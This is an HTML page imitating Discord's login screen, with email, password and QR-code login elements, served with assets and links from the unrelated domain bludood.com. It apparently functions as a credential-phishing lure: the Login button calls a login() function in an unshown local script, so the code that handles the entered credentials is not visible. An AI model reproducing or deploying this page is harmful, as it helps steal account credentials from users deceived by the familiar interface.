<!DOCTYPE html>
<html>


<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Discord</title>
    <link rel="stylesheet" href="asset/css/styles.css">
    <script src="asset/js/main.js" type="3a000a2a34f4deb188edb39d-text/javascript"></script>
</head>

<body>
    <img class="logotop" src="https://bludood.com/./assets/img/discordlogo.png">
    <div class="login-box">
        <div class="login-ic-box">
            <div class="left-box">
                <h2 class="primary">Welcome back!</h2>
                <span class="secondary">We're so excited to see you again!</span>
                <form spellcheck="false" class="form-box">
                    <h5 class="inputtitle">EMAIL OR PHONE NUMBER</h5>
                    <input class="inputbox" type="text">
                    <h5 class="inputtitle">PASSWORD</h5>
                    <input class="inputbox" type="password">
                    <a href="https://bludood.com/#">
                        <div class="reset-password">Forgot your password?</div>
                    </a>
                    <br><br>
                    <button type="button" onclick="if (!window.__cfRLUnblockHandlers) return false; login()" class="login-button" data-cf-modified-3a000a2a34f4deb188edb39d-="">Login</button>
                    <br>
                    <span class="register">Need an account? <a href="https://bludood.com/../register">Register</a> </span>
                </form>
            </div>
            <div class="qr-box">
                <img class="qrcode" src="https://bludood.com/./assets/img/qrcode.png">
                <h2>Log in with QR Code</h2>
                <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
            </div>
        </div>
    </div>
<script src="asset/js/rocket-loader.min.js" data-cf-settings="3a000a2a34f4deb188edb39d-|49" defer=""></script></body>

</html>
